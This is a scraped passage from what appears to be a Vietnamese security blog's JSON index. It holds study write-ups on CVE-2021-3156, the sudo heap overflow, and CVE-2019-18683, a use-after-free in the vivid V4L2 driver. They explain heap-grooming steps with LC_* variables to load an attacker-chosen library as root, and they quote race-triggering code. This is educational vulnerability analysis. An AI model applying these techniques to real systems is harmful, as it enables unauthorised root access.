service_user\r{\r/* And the link to the next entry. */\rstruct service_user *next;\r/* Action according to result. */\rlookup_actions actions[5];\r/* Link to the underlying library object. */\rservice_library *library;\r/* Collection of known functions. */\rvoid *known;\r/* Name of the service (`files\u0026#39;, `dns\u0026#39;, `nis\u0026#39;, ...). */\rchar name[0];\r} service_user;\r  -C·∫•u tr√∫c n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng trong nss_load_library c·ªßa libc kh√° th∆∞·ªùng xuy√™n khi v·∫•n ƒë·ªÅ overflow x·∫£y ra (trace log) ƒë·ªÉ load nh·ªØng th∆∞ vi·ªán li√™n k·∫øt ƒë·ªông l√™n. Ch√∫ng ta c√≥ th·ªÉ ghi ƒë√® tr∆∞·ªùng name v√† t·∫£i th∆∞ vi·ªán c·ªßa ch√∫ng ta l√™n.\n Sau ƒë√≥, ch√∫ng ta nh·∫Øm t·ªõi nh·ªØng th∆∞ vi·ªán m√† kh√¥ng c√≥ ƒë·∫∑c quy·ªÅn, ch·∫°y n√≥ v·ªõi quy·ªÅn root. H√†m nh∆∞ sau:  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28  static int\rnss_load_library (service_user *ni)\r{\rif (ni-\u0026gt;library == NULL)\r{\rstatic name_database default_table;\rni-\u0026gt;library = nss_new_service (service_table ?: \u0026amp;default_table,\rni-\u0026gt;name);\rif (ni-\u0026gt;library == NULL)\rreturn -1;\r}\rif (ni-\u0026gt;library-\u0026gt;lib_handle == NULL)\r{\r/* Load the shared library. */\rsize_t shlen = (7 + strlen (ni-\u0026gt;name) + 3\r+ strlen (__nss_shlib_revision) + 1);\rint saved_errno = errno;\rchar shlib_name[shlen];\r/* Construct shared object name. */\r__stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,\r\u0026#34;libnss_\u0026#34;),\rni-\u0026gt;name),\r\u0026#34;.so\u0026#34;),\r__nss_shlib_revision);\rni-\u0026gt;library-\u0026gt;lib_handle = __libc_dlopen (shlib_name);\r   M·ª•c ti√™u c·ªßa h√†m n√†y l√† ƒë·∫øn ni-\u0026gt;library-\u0026gt;lib_handle = __libc_dlopen(shlib_name) ƒë·ªÉ t·∫£i th∆∞ vi·ªán m√† ch√∫ng ta ki·ªÉm so√°t. C√≥ hai ƒëi·ªÅu m√† ch√∫ng ta c·∫ßn l∆∞u √Ω:  N·∫øu ni-\u0026gt;library kh√°c NULL, ch√∫ng ta s·∫Ω s·ª≠ d·ª•ng con tr·ªè trong ni-\u0026gt;library-\u0026gt;lib_handle v√† v√¨ ASLR n√™n ch√∫ng ta kh√¥ng th·ªÉ ƒëo√°n li·ªáu r·∫±ng con tr·ªè n√†y c√≥ h·ª£p l·ªá hay kh√¥ng. Ch√∫ng ta thi·∫øt l·∫≠p ni-\u0026gt;library=nss_new_service(...) n·∫øu con tr·ªè n√†y NULL, sau ƒë√≥ ch√∫ng ta ch·ªâ c·∫ßn ghi ƒë√® c·∫•u tr√∫c n√†y ƒë·ªÉ l·∫•y ƒë∆∞·ª£c t√™n tr∆∞·ªùng v√† ƒë·ªïi n√≥ t·ªõi nh·ªØng th∆∞ vi·ªán m√† ch√∫ng ta ki·ªÉm so√°t. Th√°ch th·ª©c th·ª© 2 l√† ch√∫ng ta c√≥ con tr·ªè struct service_user *next. N·∫øu ch√∫ng ta g√¢y ra overflow    Ghi ƒë√® c·∫•u tr√∫c service_user b·∫±ng glibc tcache T·ª´ trace log, ch√∫ng ta th·∫•y 2 l·ªánh g·ªçi nss_load_library. Sau ƒë√≥ ta ki·ªÉm tra xem service_user object ƒë∆∞·ª£c t·∫°o ·ªü v·ªã tr√≠ n√†o\n N√≥ ƒë∆∞·ª£c t·∫°o t·ª´ \u0026ldquo;nh√≥m\u0026rdquo; c√°c d√≤ng trong file \u0026ldquo;nsswitch.conf\u0026rdquo;. Nh∆∞ ch√∫ng ta th·∫•y, sudo s·∫Ω t·∫°o ra service_user objects (t·ª´ 2 d·ªãch v·ª• trong passwd line). Do ƒë√≥, m√£ th·ª±c thi c·ªßa ch√∫ng ta s·∫Ω ƒë·ªçc file nsswitch.conf ƒë·∫ª x√°c ƒë·ªãnh offset ho·∫∑c s·ªë l∆∞·ª£ng chunk size = 0x40 ƒë∆∞·ª£c t·∫°o. Thi·∫øt l·∫≠p TZ=: v√† ;x=x trong m√¥i tr∆∞·ªùng LC s·∫Ω gi√∫p ch√∫ng ta ƒëi·ªÅu khi·ªÉn vi·ªác s·ª≠ d·ª•ng heap tr∆∞·ªõc khi ph√¢n t√≠ch file \u0026quot;/etc/nsswitch.conf\u0026quot; Trace h√†m malloc/free t·ª´ l·ªánh g·ªçi h√†m sudo_conf_read_v1 t·ªõi l·ªánh get_user_info ta s·∫Ω ƒë∆∞·ª£c nh∆∞ d∆∞·ªõi\nl√†m sao ƒë·ªÉ trace ƒë∆∞·ª£c nh∆∞ t√°c gi·∫£\r V√≠ d·ª•, ta thi·∫øt l·∫≠p m√¥i tr∆∞·ªùng \u0026quot;LC_CTYPE=C.UTF-8@\u0026quot; + \u0026quot;A\u0026quot;*0x28 v√† \u0026quot;LC_NUMERIC=C.UTF-8@\u0026quot;+\u0026quot;A\u0026quot;*0x86. Chunk size c·ªßa LC_CTYPE l√† 0x30+8 (8 l√† k√≠ch th∆∞·ªõc c·ªßa heap metadata), sau ƒë√≥ ƒë∆∞·ª£c l√†m tr√≤n l√™n 0x40 v√† chunk size c·ªßa LC_NUMERIC l√† 0x80. R·ªìi ch√∫ng ta s·∫Ω ƒë∆∞·ª£c b·ªë c·ª•c t∆∞·ª£ng t·ª± nh∆∞ h√¨nh b√™n cho nsswitch.conf v·ªõi 2 d·ªãch v·ª• cho passwd.  1 2 3 4 5  LC_COLLATE LC_TIME LC_NUMERIC LC_CTYPE\r--+-------------+----+------------+---+-------------+---+-------------+---\r| free 0x40 | .. | free 0x40 |...| free 0x80 |...| freed 0x40 |\r--+-------------+----+------------+---+-------------+---+-------------+---\r  Do ƒë√≥, s·∫Ω h∆∞·ªõng ƒë·∫øn servirce_user object t·∫°i v√πng nh·ªõ LC_CTYPE b·ªã gi·∫£i ph√≥ng v√† th·ª±c hi·ªán heap overflow t·∫°i LC_NUMERIC ƒë·ªÉ ghi ƒë√® service_user object\n","description":"L·ªói cho ph√©p ng∆∞·ªùi d√πng b√¨nh th∆∞·ªùng l·∫•y ƒë∆∞·ª£c root m√† kh√¥ng c·∫ßn bi·∫øt m·∫≠t kh·∫©u c·ªßa root","id":6,"section":"posts","tags":["cve, linux kernel, V4l2"],"title":"T√¨m hi·ªÉu v·ªÅ CVE-2021‚Äì3156 (A Sudo vulnerability)","uri":"https://minhlongmt183.github.io/posts/cve-2021-3156/"},{"content":"B√†i vi·∫øt n√†y nh·∫±m m·ª•c ƒë√≠ch ghi l·∫°i nh·ªØng ki·∫øn th·ª©c ƒë√£ h·ªçc ƒë·ªÉ nh·ªõ v√† hi·ªÉu r√µ h∆°n. B√†i vi·∫øt tham kh·∫£o ch·ªß y·∫øu t·ª´ CVE-2019-18683: Exploiting a Linux kernel vulnerability in the V4L2 subsystem\r Vulnerabilities ch√∫ng ta t·∫£i source code kernel v·ªÅ v√† xem t·∫°i: linux-x/drivers/media/platform/vivid/\r  L·ªó h·ªïng b·∫Øt ngu·ªìn t·ª´ sai s√≥t trong hi·ªán th·ª±c, s·ª≠ d·ª•ng mutex lock c·ªßa driver vivid trong subsystem V4L2 - (drivers/media/platform/vivid). Driver n√†y kh√¥ng y√™u c·∫ßu b·∫•t c·ª© ph·∫ßn c·ª©ng ƒë·∫∑c bi·ªát n√†o. N√≥ ƒë√≥ng vai tr√≤ nh∆∞ m·ªôt kernel module (CONFIG_VIDEO_VIVID=m) trong c√°c h·ªá ƒëi·ªÅu h√†nh nh∆∞: Ubuntu, Debian, Arch Linux, SUSE Linux Enterprise, and openSUSE. Driver vivid m√¥ ph·ªèng ph·∫ßn c·ª©ng video4linux c·ªßa nhi·ªÅu lo·∫°i: video capture, video output, radio receivers and transmitters and a software defined radio receivers. Nh·ªØng input v√† output s·∫Ω ho·∫°t ƒë·ªông gi·ªëng nh∆∞ nh·ªØng thi·∫øt b·ªã v·∫≠t l√≠ th·∫≠t, do ƒë√≥, n√≥ cho ph√©p ·ª©ng d·ª•ng th·ª±c hi·ªán m√† kh√¥ng c·∫ßn b·∫•t c·ª© thi·∫øt b·ªã ph·∫ßn c·ª©ng ƒë·∫∑c bi·ªát n√†o. Tr√™n Ubuntu, nh·ªØng thi·∫øt b·ªã ƒë∆∞·ª£c t·∫°o b·ªüi driver vivid ƒë·ªÅu ho·∫°t ƒë·ªông cho ng∆∞·ªùi d√πng b√¨nh th∆∞·ªùng, v√¨ ubuntu s·ª≠ d·ª•ng RW USAL khi ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p  open, read v√† close trong vivid open H√†m n√†y th√¨ kh√¥ng c√≥ g√¨ ƒë·∫∑c bi·ªát v·ªõi tr∆∞·ªùng h·ª£p l·ªói n√†y, n√≥ ch·ªâ ƒë∆°n gi·∫£n ƒë∆∞·ª£c g·ªçi ƒë·ªÉ b·∫≠t thi·∫øt b·ªã\nread Ch√∫ng ta c√πng theo flow c·ªßa l·ªánh read n√†y\nstateDiagram\rread --\u0026gt; vfd_read\rvfd_read --\u0026gt; vb2_fop_read\rvb2_fop_read --\u0026gt; __vb2_perform_fileio\r__vb2_perform_fileio --\u0026gt; vb2_core_reqbufs\rvb2_core_reqbufs --\u0026gt; vb_queue_alloc\r__vb2_perform_fileio --\u0026gt; vb2_core_qbuf\r__vb2_perform_fileio --\u0026gt; vb2_core_streamon\rvb2_core_streamon --\u0026gt; vb2_start_streaming\rvb2_start_streaming --\u0026gt; __enqueue_in_driver\rvb2_start_streaming --\u0026gt; vbi_cap_start_streaming\r__vb2_perform_fileio --\u0026gt; vb2_core_dqbuf\r vb2_queue: h√†ng ƒë·ª£i n√†y s·∫Ω ch·ª©a vb2_buffer c·ªßa ·ª©ng d·ª•ng, ƒë∆∞·ª£c l∆∞u ·ªü `vb2_queue-\u0026gt;bufs) vb2_buffer: l∆∞u th√¥ng tin v·ªÅ c√°c ho·∫°t ƒë·ªông c·ªßa video stream. Khi l·ªánh read th·ª±c hi·ªán, n√≥ g·ªçi vb_queue_alloc ƒë·ªÉ c·∫•p ph√°t v√πng nh·ªõ (kmalloc-1k) ƒë·ªÉ ch·ª©a nh·ªØng th√¥ng tin t·ª´ vb2_buffer v√† sau ƒë√≥ l·∫•y nh·ªØng th√¥ng tin n√†y ra ƒë·ªÉ th·ª±c hi·ªán. Qu√° tr√¨nh data streaming th·ª±c ch·∫•t l√† qu√° tr√¨nh vi·∫øt v√† ƒë·ªçc t·ª´ buffer vb2_buffer ƒë∆∞·ª£c th√™m v√†o vb2_queue (vb2_queue-\u0026gt;queued_list) ƒêi·ªÅu ch√∫ √Ω ·ªü ƒë√¢y, kh√≥a dev-\u0026gt;mutex c·ªßa vb2_fop_read v√† kh√≥a t·∫°i vb2_queue-\u0026gt;lock l√† m·ªôt kh√≥a. xem hi·ªán th·ª±c t·∫°i ƒë√¢y Sau khi vb_buffer ƒë∆∞·ª£c th√™m v√†o h√†ng ƒë·ª£i, ch∆∞∆°ng tr√¨nh s·∫Ω b·∫Øt ƒë·∫ßu streaming, g·ªçi vb2_start_streaming ƒë·ªÉ ƒë∆∞a d·ªØ li·ªáu v√†o vb_buffer. Qu√° tr√¨nh n√†y n√≥ s·∫Ω g·ªçi __enqueue_in_driver ƒë·ªÉ th√™m buffer v√†o vivid_dev, h√†ng ƒë·ª£i vid_cap_active ƒë·ªÉ ƒë∆∞·ª£c x·ª≠ l√≠. Qu√° tr√¨nh tr√™n t∆∞∆°ng ƒë∆∞∆°ng v·ªõi vi·ªác g·ªçi h√†m vid_cap_buf_queue  1 2 3 4 5 6 7 8 9 10  static void vid_cap_buf_queue(struct vb2_buffer *vb)\r{\rstruct vb2_v4l2_buffer *vbuf = to_vb2_v4l2_buffer(vb);\rstruct vivid_dev *dev = vb2_get_drv_priv(vb-\u0026gt;vb2_queue);\rstruct vivid_buffer *buf = container_of(vbuf, struct vivid_buffer, vb);\rspin_lock(\u0026amp;dev-\u0026gt;slock);\rlist_add_tail(\u0026amp;buf-\u0026gt;list, \u0026amp;dev-\u0026gt;vid_cap_active);//\r spin_unlock(\u0026amp;dev-\u0026gt;slock);\r}\r  Sau ƒë√≥ g·ªçi vid_cap_start_streaming, h√†m n√†y s·∫Ω g·ªçi vivid_start_generating_vid_cap ƒë·ªÉ kh·ªüi t·∫°o 1 kernel thread th·ª±c hi·ªán h√†m vivid_thread_vid_caption\n1 2  dev-\u0026gt;kthread_vid_cap = kthread_run(vivid_thread_vid_cap, dev,\r\u0026#34;%s-vid-cap\u0026#34;, dev-\u0026gt;v4l2_dev.name);\r   H√†m vivid_thread_vid_cap n√†y c√≥ nhi·ªám v·ª• ƒë∆∞a d·ªØ li·ªáu v√†o vb2_buffer. Sau d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a xong, n√≥ s·∫Ω b∆∞·ªõc v√≤ng 1 v√≤ng l·∫∑p v√¥ h·∫°n, ng·ªìi ƒë·ª£i l·∫•y kh√≥a lock(mutex_lock(\u0026amp;dev-\u0026gt;mutex)), khi nh·∫≠n ƒë∆∞·ª£c kh√≥a, d·ªØ li·ªáu tr√™n vb2_buffer m·ªõi ƒë∆∞·ª£c x·ª≠ l√≠. Nh∆∞ ƒë√£ n√≥i, vb2_fop_read c≈©ng c√≥ kh√≥a, v√† kh√≥a n√†y v·ªõi kh√≥a ·ªü b∆∞·ªõc tr√™n vivid_thread_vid_cap l√† m·ªôt, ƒëi·ªÅu n√†y c√≥ nghƒ©a, khi thread ƒëang th·ª±c hi·ªán vivid_thread_vid_cap m·ªü kh√≥a, m·ªôt thread n√†o ƒë√≥ th·ª±c hi·ªán vb2_fop_read c√≥ kh√≥a, n√≥ c√≥ th·ªÉ v√†o v√πng nh·ªõ n√†y ƒë·ªÉ th·ª±c hi·ªán. Gi·ªëng nh∆∞ ng√¥i nh√† ch·ªâ c√≥ th·ªÉ ch∆∞a 1 ng∆∞·ªùi, c√≥ 2 ng∆∞·ªùi gi·ªØ ch√¨a kh√≥a, khi 1 ng∆∞·ªùi b√™n trong ƒëi ra, ng∆∞·ªùi c√≤n l·∫°i n·∫øu ƒëang gi·ªØ ch√¨a kh√≥a, anh ta ho√†n to√†n c√≥ th·ªÉ v√†o cƒÉn nh√†. CƒÉn nh√† ·ªü ƒë√¢y l√† vb2_buf, c√≤n 2 ng∆∞·ªùi l·∫ßn l∆∞·ª£t l√† 2 thread ƒëang ch·∫°y vivid_thread_vid_cap v√† vb2_fop_read.\nNh∆∞ng t·∫°i sao ƒëang gi·ªØ kh√≥a r·ªìi l·∫°i m·ªü kh√≥a, sau ƒë√≥ l·∫°i ch·ªù c√≥ l·∫°i kh√≥a, t√¥i v·∫´n ch∆∞a hi·ªÉu t·∫°i sao l·∫°i nh∆∞ th·∫ø, nh∆∞ng ƒë√¢y ch√≠nh l√† nguy√™n nh√¢n g√¢y ra CVE n√†y. Quan s√°t kƒ© h∆°n v·ªÅ h√†m vb2_core_dqbuf:  stateDiagram\rvb2_core_dqbuf --\u0026gt; __vb2_get_done_vb\r__vb2_get_done_vb --\u0026gt; __vb2_wait_for_done_vb\r__vb2_wait_for_done_vb --\u0026gt; vb2_ops_wait_prepare\r__vb2_wait_for_done_vb --\u0026gt; vb2_ops_wait_finish\r·ªû ƒë√¢y, vb2_ops_wait_prepare s·∫Ω tr·∫£ kh√≥a vb2_queue-\u0026gt;lock, vb2_ops_wait_finish s·∫Ω ch·ªù nh·∫≠n kh√≥a v√† k·∫øt th√∫c.\nHay n√≥i c√°ch kh√°c, vb2_core_dqbuf s·∫Ω tr·∫£ kh√≥a, vivid_thread_vid_cap c√≥ kh√≥a s·∫Ω v√†o th·ª±c hi·ªán, vb2_core_dqbuf ph·∫£i ch·ªù vivid_thread_vid_cap th·ª±c hi·ªán xong, ƒë∆∞a l·∫°i kh√≥a r·ªìi m·ªõi ho√†n t·∫•t vi·ªác c·ªßa m√¨nh.\nV·∫•n ƒë·ªÅ ch√≠nh l√† ·ªü b∆∞·ªõc n√†y. gi·ªëng nh∆∞ vi·ªác b·∫°n m∆∞·ª£n ph√≤ng trong v√≤ng 45\u0026rsquo; r·ªìi b·∫°n ph·∫£i kh√≥a ph√≤ng, ƒëem ch√¨a kh√≥a xu·ªëng cho b·∫£o v·ªá ƒë·ªÉ b·∫£o v·ªá l√™n ki·ªÉm tra, b·∫£o v·ªá ki·ªÉm tra xong s·∫Ω ƒë∆∞a l·∫°i ch√¨a kh√≥a cho b·∫°n ƒë·ªÉ b·∫°n v√†o ph√≤ng ti·∫øp. Nh∆∞ng trong qu√° tr√¨nh b·∫°n ƒëem ch√¨a kh√≥a xu·ªëng cho b·∫£o v·ªá th√¨ 1 ng∆∞·ªùi kh√°c c√≥ ƒë∆∞·ª£c chi·∫øc ch√¨a kh√≥a n√†y, h·ªç ho√†n to√†n c√≥ th·ªÉ v√†o ph√≤ng l√∫c n√†y. K√¨ v·ªçng c·ªßa ng∆∞·ªùi l·∫≠p tr√¨nh l√† mu·ªën vivid_thread_vid_cap ƒëi v√†o khi vb2_core_dqbuf tr·∫£ kh√≥a, nh∆∞ng l√∫c n√†y, n·∫øu 1 process kh√°c ƒëang ch·∫°y v√† g·ªçi vb2_fop_read th√¨ h·ªç s·∫Ω c√≥ ƒë∆∞·ª£c ch√¨a kh√≥a n√†y.\n B√™n d∆∞·ªõi l√† ·∫£nh khi debug, c√≥ th·ªÉ th·∫•y m·∫∑c d√π h√†m vivid_thread_vid_cap ƒë√£ th·ª±c thi xong h·∫øt r·ªìi vb2_fop_read kh√¥ng k·∫øt th√∫c ngay, n√≥ l·∫°i g·ªçi vb2_core_qbuf m·ªôt l·∫ßn n·ªØa. Khi ƒë√≥, h√†m n√†y l·∫°i v√†o ƒë·ªçc d·ªØ li·ªáu m√† v·ªën dƒ© ƒë√† ƒë∆∞·ª£c th·ª±c hi·ªán xong b·ªüi 1 process kh√°c. Khi n√≥ g·ªçi __enqueue_in_driver, vb2_buffer s·∫Ω ƒë∆∞·ª£c th√™m v√†o h√†ng ƒë·ª£i dev-\u0026gt;vid_cap_active ƒë·ªÉ th·ª±c hi·ªán. Sau ƒë√≥ vb2_fop_read m·ªõi k·∫øt th√∫c. ƒêi·ªÅu n√†y d·∫´n t·ªõi, sau khi vb2_fop_read k·∫øt th√∫c, th√¨ ƒë·ªãa vb2_buffer l·∫°i ƒë∆∞·ª£c l∆∞u trong dev-\u0026gt;vid_cap_active ƒë·ªÉ chu·∫©n b·ªã cho 1 process kh√°c th·ª±c hi·ªán. Khi t√¨m hi·ªÉu v·ªÅ dev-\u0026gt;vid_cap_active th√¨ t√¥i th·∫•y n√≥ ƒë∆∞·ª£c s·ª≠ d·ª•ng b·ªüi 3 h√†m: vivid_thread_vid_cap, vid_cap_start_streaming v√† vivid_stop_generating_vid_cap.  vivid_thread_vid_cap: l·∫•y t·∫•t c·∫£ d·ªØ li·ªáu trong h√†ng ƒë·ª£i vid_cap_active ra, do ƒë√≥, sau khi th·ª±c hi·ªán xong, buffer s·∫Ω kh√¥ng c√≤n trong h√†ng ƒë·ª£i. vid_cap_start_streaming m·ª•c ƒë√≠ch ch√≠nh l√† ki·ªÉm tra xem tr·∫°ng th√°i c·ªßa buffer v√† th·ª±c hi·ªán m·ªôt s·ªë chuy·ªÉn ƒë·ªïi, sau khi th·ª±c hi·ªán xong, buffer v·∫´n c√≤n trong h√†ng ƒë·ª£i. vivid_stop_generating_vid_cap ƒë∆∞·ª£c d√πng trong h√†m close(fd), d√πng ƒë·ªÉ x√≥a t·∫•t c·∫£ c√°c d·ªØ li·ªáu trong h√†ng ƒë·ª£i, bao g·ªìm c·∫£ buffer.    close Ch√∫ng ta ƒë√£ t√¨m hi·ªÉu v·ªÅ h√†m read v√† th·∫•y r·∫±ng sau khi th·ª±c hi·ªán h√†m read, vb2_buffer l·∫°i ƒë∆∞·ª£c 1 process kh√°c ƒë∆∞a v√†o h√†ng ƒë·ª£i ƒë·ªÉ chu·∫©n b·ªã cho qu√° tr√¨nh th·ª±c hi·ªán. V·∫≠y khi process hi·ªán t·∫°i th·ª±c hi·ªán xong l·ªánh close th√¨ vb2_buffer s·∫Ω b·ªã ·∫£nh h∆∞·ªüng nh∆∞ th·∫ø n√†o? Ch√∫ng ta h√£y c√πng xem flow khi g·ªçi h√†m close\nstateDiagram\rvivid_fop_release --\u0026gt; vb2_fop_release\rvb2_fop_release --\u0026gt; vb2_queue_release\rvb2_queue_release --\u0026gt; vb2_core_queue_release\rvb2_core_queue_release --\u0026gt; __vb2_cleanup_fileio\r__vb2_cleanup_fileio --\u0026gt; vb2_core_streamoff\rvb2_core_streamoff --\u0026gt; __vb2_queue_cancel\r__vb2_queue_cancel --\u0026gt; vivid_stop_generating_vid_cap\r__vb2_cleanup_fileio --\u0026gt; vb2_core_reqbufs\rvb2_core_reqbufs --\u0026gt; __vb2_queue_free\rNh√¨n v√†o l∆∞·ª£c ƒë·ªì tr√™n, ta th·∫•y kh√° ƒë∆°n gi·∫£n, tuy nhi√™n c√≥ m·ªôt ch√∫ √Ω:\n H√†m vivid_stop_generating_vid_cap tr·∫£ kh√≥a, r·ªìi g·ªçi kthread_stop ƒë·ªÉ d·ª´ng kernel thread ƒëang th·ª±c hi·ªán h√†m vivid_thread_vid_cap.\nN·∫øu nh∆∞ k·∫øt th√∫c h√†m read() n√≥ ch·ªâ t·∫°o ra m·ªôt nguy c∆° x·∫£y ra l·ªói uaf, th√¨ t·∫°i ƒë√¢y ch√≠nh l√† nguy√™n nh√¢n g√¢y ra l·ªói uaf.  1 2 3 4  mutex_unlock(\u0026amp;dev-\u0026gt;mutex);\rkthread_stop(dev-\u0026gt;kthread_vid_cap);\rdev-\u0026gt;kthread_vid_cap = NULL;\rmutex_lock(\u0026amp;dev-\u0026gt;mutex);\r  Sau khi vivid_stop_generating_vid_cap th·ª±c hi·ªán xong, n√≥ s·∫Ω g·ªçi h√†m __vb2_queue_free ƒë·ªÉ gi·∫£i ph√≥ng vb2_queue-\u0026gt;bufs v√† vb2_buffer, r√≤i ƒë√≥ng process hi·ªán t·∫°i. ƒê·ª´ng qu√™n r·∫±ng, vb2_buffer ngay l√∫c n√†y ƒëang ƒë∆∞·ª£c 1 process kh√°c ƒë∆∞a v√†o h√†ng ƒë·ª£i vid_cap_active ƒë·ªÉ chu·∫©n b·ªã th·ª±c thi. ƒêi·ªÅu n√†y d·∫´n t·ªõi l·ªói UAF\nBugs and Fixes  T√°c gi·∫£ s·ª≠ d·ª•ng skyzkaller fuzzer v·ªõi nh·ªØng t√πy ch·ªânh trong kernel source code v√† th·∫•y nh·ªØng crash trong kernel. KASAN ph√°t hi·ªán ra l·ªói use-after-free trong c√°c thao t√°c danh s√°ch li√™n k·∫øt trong vid_cap_buf_queue(). Nguy√™n nh√¢n l√† do s·ª± sai s√≥t trong qu√° tr√¨nh s·ª≠ d·ª•ng kh√≥a (mutex lock) trong vivid_stop_generating_vid_cap(), vivid_stop_generating_vid_out() v√† sdr_cap_stop_streaming(). Nh·ªØng h√†m tr√™n ƒë∆∞·ª£c g·ªçi khi b·ªã kh√≥a vivid_dev.mutex, qu√° tr√¨nh streaming b·ªã d·ª´ng. Ch√∫ng c√πng m·∫Øc ph·∫£i m·ªôt l·ªói l√† khi mu·ªën d·ª´ng kthreads th√¨ n√≥ c≈©ng c·∫ßn ph·∫£i kh√≥a mutex n√†y. V√≠ d·ª•, trong h√†m vivid_stop_generating_vid_cap():  1 2 3 4 5 6  /* shutdown control thread */\rvivid_grab_controls(dev, false);\rmutex_unlock(\u0026amp;dev-\u0026gt;mutex);\rkthread_stop(dev-\u0026gt;kthread_vid_cap);\rdev-\u0026gt;kthread_vid_cap = NULL;\rmutex_lock(\u0026amp;dev-\u0026gt;mutex);\r   Tuy nhi√™n, khi mutex ƒë∆∞·ª£c unlocked, m·ªôt h√†m kh√°c vb2_fop_read() c√≥ th·ªÉ kh√≥a n√≥ thay v√¨ kthread v√† thao t√°c tr√™n h√†ng ƒë·ª£i (buffer queue). ƒêi·ªÅu n√†y d·∫´n t·ªõi kh·∫£ nƒÉng x·∫£y ra use-after-free sau n√†y khi streaming ho·∫°t ƒë·ªông tr·ªü l·∫°i. ch∆∞a bi·∫øt c√°ch s·ª≠ d·ª•ng skyzkaller fuzzer.\nV√¨ sao d·∫´n t·ªõi kh·∫£ nƒÉng x·∫£y ra use-after-free? (ƒë√£ tr·∫£ l·ªùi trong c∆° ch·∫ø h√†m read, close trong vivid)\r ƒê·ªÉ gi·∫£i quy·∫øt t√¨nh tr·∫°ng tr√™n, t√°c gi·∫£ ƒë·ªÅ xu·∫•t nh∆∞ sau:   Kh√¥ng m·ªü kh√≥a mutex khi stream d·ª´ng. V√≠ d·ª• ·ªü h√†m vivid_stop_generating_vid_cap() ch√∫ng ta s·∫Ω b·ªè 2 h√†m:  1 2 3 4 5 6  /* shutdown control thread */\rvivid_grab_controls(dev, false);\r-\tmutex_unlock(\u0026amp;dev-\u0026gt;mutex);\r\tkthread_stop(dev-\u0026gt;kthread_vid_cap);\rdev-\u0026gt;kthread_vid_cap = NULL;\r-\tmutex_lock(\u0026amp;dev-\u0026gt;mutex);   S·ª≠ d·ª•ng mutex_trylock() v·ªõi schedule_timeout_uninterruptible() trong v√≤ng l·∫∑p c·ªßa vivid kthread handler. H√†m x·ª≠ l√≠ vivid_thread_vid_cap() ƒë∆∞·ª£c thay ƒë·ªïi nh∆∞ sau:  1 2 3 4 5 6 7 8 9 10 11  for (;;) {\rtry_to_freeze();\rif (kthread_should_stop())\rbreak;\r-\tmutex_lock(\u0026amp;dev-\u0026gt;mutex);\r+\tif (!mutex_trylock(\u0026amp;dev-\u0026gt;mutex)) {\r+\tschedule_timeout_uninterruptible(1);\r+\tcontinue;\r+\t}\r ...\r}\r  N·∫øu mutex n√†y kh√¥ng ho·∫°t ƒë·ªông, kthread s·∫Ω ng·ªß trong gi√¢y l√°t r·ªìi th·ª≠ l·∫°i. Trong tr∆∞·ªùng h·ª£p x·∫•u nh·∫•t, kthread s·∫Ω ng·ªß v√†i l·∫ßn v√† ch·∫°m ƒë·∫øn break ƒë·ªÉ tho√°t kh·ªèi v√≤ng l·∫∑p hi·ªán t·∫°i.\nWinning the race  Ch√∫ng ta ƒë√£ hi·ªÉu t·∫°i sao l·∫°i vivid l·∫°i c√≥ th·ªÉ d·∫´n t·ªõi l·ªói UAF, b√¢y gi·ªù ch√∫ng ta s·∫Ω ti·∫øn h√†nh khai th√°c l·ªói n√†y. ƒê·ªÉ test kernel, ch√∫ng ta c·∫ßn ƒë·∫£m b·∫£o:  ƒê√£ c√≥ vivid driver /dev/video0 is the V4L2 capture device Ch√∫ng ta ƒë√£ login     Ch√∫ng ta t·∫°o 2 pthreads. Tr∆∞·ªùng h·ª£p n√†y, b·∫Øt bu·ªôc s·ª≠ d·ª•ng ched_setaffinity ƒë·ªÉ racing t·ªët h∆°n.  1 2 3 4 5 6 7  cpu_set_t single_cpu;\rCPU_ZERO(\u0026amp;single_cpu);\rCPU_SET(cpu_n, \u0026amp;single_cpu);\rret = sched_setaffinity(0, sizeof(single_cpu), \u0026amp;single_cpu);\rif (ret != 0)\rerr_exit(\u0026#34;[-] sched_setaffinity for a single CPU\u0026#34;);\r  Ch√∫ng ta ti·∫øn h√†nh race  1 2 3 4 5 6 7 8 9 10  for (loop = 0; loop \u0026lt; LOOP_N; loop++) {\rint fd = 0;\rfd = open(\u0026#34;/dev/video0\u0026#34;, O_RDWR);\rif (fd \u0026lt; 0)\rerr_exit(\u0026#34;[-] open /dev/video0\u0026#34;);\rread(fd, buf, 0xfffded);\rclose(fd);\r}\r   Khai b·∫Øt ƒë·∫ßu streaming h√†m vid_cap_start_streaming() s·∫Ω , ƒë∆∞·ª£c g·ªçi b·ªüi V4L2 trong khi vb2_core_streamon() ƒë·ªçc t·ª´ file descriptor. Khi d·ª´ng streaming, h√†m vivid_stop_generating_vid_cap() s·∫Ω ƒë∆∞·ª£c V4L2 g·ªçi trong khi __vb2_queue_cancel() s·∫Ω gi·∫£i ph√≥ng tham kh·∫£o cu·ªëi c√πng ƒë·∫øn file. Do ƒë√≥, n·∫øu m·ªôt tr√¨nh ƒë·ªçc kh√°c \u0026ldquo;chi·∫øn th·∫Øng\u0026rdquo; kthreads, n√≥ s·∫Ω g·ªçi vb2_core_qbuf(), h√†m n√†y s·∫Ω th√™m vb2_buffer v√†o vb2_queue.queued_list. Khi ch·∫°y ƒëo·∫°n code tr√™n, ch√∫ng ta c√≥ th·ªÉ s·∫Ω ƒë∆∞·ª£c k·∫øt qu·∫£ nh∆∞ sau:\n Ta c√≥ 2 thread ch·∫°y tr√™n 2 CPU kh√°c nhau, m√†u ƒë·ªè ƒë·∫°i di·ªán thread A, m√†u xanh ƒë·∫°i di·ªán thread B     Thread A Thread B     Ch·∫°y vb2_core_dqbuf, tr·∫£ kh√≥a (gi·∫£ s·ª≠ vivid_thread_vid_cap ƒë√£ c√≥ kh√≥a)     vb2_fop_read l·∫•y ƒë∆∞·ª£c kh√≥a, th·ª±c hi·ªán v√† c√≥ v·∫ª kh√¥ng th·ªèa m√£n ƒëi·ªÅu ki·ªán n√†o ƒë√≥ n√™n d·ª´ng, tr·∫£ kh√≥a l·∫°i   vivid_thread_vid_cap nh·∫≠n ƒë∆∞·ª£c kh√≥a, gi·∫£i ph√≥ng buffer     th·ª±c hi·ªán h√†m close(fd), g·ªçi h√†m vivid_stop_genrating_vid_cap ƒë·ªÉ 